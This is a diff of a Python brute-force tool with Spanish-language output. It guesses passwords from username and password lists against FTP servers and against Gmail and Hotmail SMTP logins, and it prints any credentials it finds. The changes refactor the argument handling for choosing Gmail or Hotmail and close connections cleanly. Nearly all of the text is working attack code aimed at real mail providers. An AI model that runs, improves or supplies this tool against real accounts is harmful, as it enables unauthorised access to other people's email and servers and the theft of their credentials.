@@ -18,6 +18,7 @@ def bforcemail(users, passwords, server):
 				print("{} es la clave de {}".format(password, user))
 				exit()
 		sleep(3)
+	server.quit()
 def bforceftp(users, passwords, server, tm):
 	conexion = FTP(server)
 	for user in users:
@@ -32,6 +33,7 @@ def bforceftp(users, passwords, server, tm):
 				print("Usuario: {}".format(user))				
 				print("Clave: {}".format(password))
 				exit()
+	conexion.quit()
 
 				
 
@@ -89,6 +91,7 @@ if __name__ == '__main__':
 				continue
 			elif arg == "--mail":
 				mail = True
+				srv = str()
 				argcount += 1
 				continue
 			if ftp == True and mail == True:
@@ -111,21 +114,21 @@ if __name__ == '__main__':
 			else:
 				print("No se reconoce '{}' como una bandera.".format(arg))
 				exit()
-			argcount += 1			
+			argcount += 1
+			if gm == True and hm == True:
+				print("No se puede usar -gm y -hm al mismo tiempo.")
+				exit()
+		if gm == True:
+		    srv = 'smtp.gmail.com:587'
+		elif hm == True:
+			srv = 'smtp.live.com:587'
 		if ftp == True and ip == "":
 			print("para usar --ftp se ocupa determinar una ip:\n-hst (ip del servidor ftp)")
 			exit()
 		elif ftp == True:
 			bforceftp(userslist, passwordlist, ip, time)
-		elif mail == True:
-			if gm == False and hm == gm:
-				prin("No se ha especificado que tipo de cuenta se va a atacar.")
-				exit()
-			else:
-				if gm == True:
-					bforcemail(userslist, passwordlist, 'smtp.gmail.com:587')
-				else:
-					bforcemail(userslist, passwordlist, 'smtp.live.com:587')
-			
-
-
+		elif mail == True and srv != "":
+			bforcemail(userslist, passwordlist, srv)
+		elif mail == True and srv == "":
+			print("No se ha determinado si se usará gmail o hotmail.")
+			exit()
